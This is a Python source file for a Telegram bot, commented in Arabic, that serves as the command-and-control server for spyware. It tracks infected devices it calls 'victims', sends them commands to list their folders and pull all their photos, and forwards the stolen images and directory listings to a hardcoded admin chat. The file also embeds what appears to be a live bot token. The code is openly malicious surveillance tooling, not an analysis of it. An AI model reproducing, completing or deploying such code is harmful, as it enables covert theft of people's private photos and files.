	import os
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters
from datetime import datetime
import asyncio

# ============= إعدادات البوت =============
# ضع التوكن و Chat ID هنا
TOKEN = "8794579481:AAGNquogxF_5Gi-gGfDJHOusrJan8rPHkfw"
ADMIN_CHAT_ID = 1033014201  # ضع Chat ID الخاص بك هنا

# تخزين بيانات الضحايا
victims = {}  # {victim_id: {"chat_id": chat_id, "name": name, "photos": []}}

# ============= دوال مساعدة =============
def log(message):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")

# ============= أوامر البوت =============
async def start(update: Update, context):
    """إظهار قائمة الضحايا"""
    chat_id = update.effective_chat.id
    
    # التأكد أن المستخدم هو الأدمن
    if chat_id != ADMIN_CHAT_ID:
        await update.message.reply_text("⚠️ هذا البوت خاص.")
        return
    
    if not victims:
        await update.message.reply_text("📭 لا يوجد ضحايا حالياً.")
        return
    
    # بناء قائمة الضحايا
    keyboard = []
    for vid, data in victims.items():
        keyboard.append([InlineKeyboardButton(f"👤 {data['name']}", callback_data=f"victim_{vid}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🎯 اختر الضحية:", reply_markup=reply_markup)

async def victim_menu(update: Update, context):
    """قائمة التحكم بالضحية"""
    query = update.callback_query
    await query.answer()
    
    victim_id = query.data.replace("victim_", "")
    victim = victims.get(victim_id)
    
    if not victim:
        await query.edit_message_text("❌ الضحية غير موجودة.")
        return
    
    context.user_data['current_victim'] = victim_id
    
    keyboard = [
        [InlineKeyboardButton("📂 عرض المجلدات", callback_data="list_dirs")],
        [InlineKeyboardButton("📸 كل الصور", callback_data="all_photos")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="back")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🎯 الضحية: {victim['name']}\n📱 Chat ID: {victim['chat_id']}\n📸 عدد الصور: {len(victim.get('photos', []))}",
        reply_markup=reply_markup
    )

async def list_directories(update: Update, context):
    """عرض المجلدات المتاحة للضحية"""
    query = update.callback_query
    await query.answer()
    
    victim_id = context.user_data.get('current_victim')
    victim = victims.get(victim_id)
    
    if not victim:
        await query.edit_message_text("❌ خطأ.")
        return
    
    # إرسال طلب للجهاز لعرض المجلدات
    await context.bot.send_message(
        chat_id=victim['chat_id'],
        text="CMD:LIST_DIRS"
    )
    
    await query.edit_message_text("📂 جاري طلب قائمة المجلدات...")

async def get_all_photos(update: Update, context):
    """طلب كل الصور من الضحية"""
    query = update.callback_query
    await query.answer()
    
    victim_id = context.user_data.get('current_victim')
    victim = victims.get(victim_id)
    
    if not victim:
        await query.edit_message_text("❌ خطأ.")
        return
    
    # إرسال طلب للجهاز لسحب كل الصور
    await context.bot.send_message(
        chat_id=victim['chat_id'],
        text="CMD:GET_ALL_PHOTOS"
    )
    
    await query.edit_message_text("📸 جاري سحب كل الصور...")

async def back(update: Update, context):
    """العودة للقائمة الرئيسية"""
    query = update.callback_query
    await query.answer()
    await start(update, context)

# ============= استقبال الصور والبيانات من الضحايا =============
async def handle_message(update: Update, context):
    """معالجة الرسائل القادمة من الضحايا"""
    chat_id = update.effective_chat.id
    text = update.message.text
    
    if text and text.startswith("VICTIM:"):
        # تسجيل ضحية جديدة
        parts = text.split(":")
        if len(parts) >= 2:
            victim_id = parts[1]
            victim_name = parts[2] if len(parts) > 2 else "Unknown"
            victims[victim_id] = {
                "chat_id": chat_id,
                "name": victim_name,
                "photos": []
            }
            log(f"✅ ضحية جديدة: {victim_name} ({victim_id})")
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"🆕 ضحية جديدة!\n👤 {victim_name}\n🆔 {victim_id}"
            )
    
    elif text and text.startswith("DIRS:"):
        # استقبال قائمة المجلدات
        dirs = text.replace("DIRS:", "")
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=f"📂 مجلدات الضحية:\n{dirs}"
        )
    
    elif update.message.photo:
        # استقبال صورة
        photo = update.message.photo[-1]
        file = await context.bot.get_file(photo.file_id)
        
        # حفظ الصورة
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"photo_{timestamp}.jpg"
        
        await file.download_to_drive(filename)
        
        # إرسال الصورة للأدمن
        with open(filename, 'rb') as f:
            await context.bot.send_photo(
                chat_id=ADMIN_CHAT_ID,
                photo=f,
                caption=f"📸 صورة من ضحية\n🆔 {chat_id}\n🕐 {timestamp}"
            )
        
        os.remove(filename)
        log(f"📸 استقبلت صورة من {chat_id}")

# ============= تشغيل البوت =============
def main():
    log("🚀 تشغيل البوت...")
    
    app = Application.builder().token(TOKEN).build()
    
    # أوامر الأدمن
    app.add_handler(CommandHandler("start", start))
    
    # معالجة الأزرار
    app.add_handler(CallbackQueryHandler(victim_menu, pattern="^victim_"))
    app.add_handler(CallbackQueryHandler(list_directories, pattern="^list_dirs$"))
    app.add_handler(CallbackQueryHandler(get_all_photos, pattern="^all_photos$"))
    app.add_handler(CallbackQueryHandler(back, pattern="^back$"))
    
    # معالجة الرسائل
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.PHOTO, handle_message))
    
    log("✅ البوت يعمل...")
    app.run_polling()

if __name__ == "__main__":
    main()
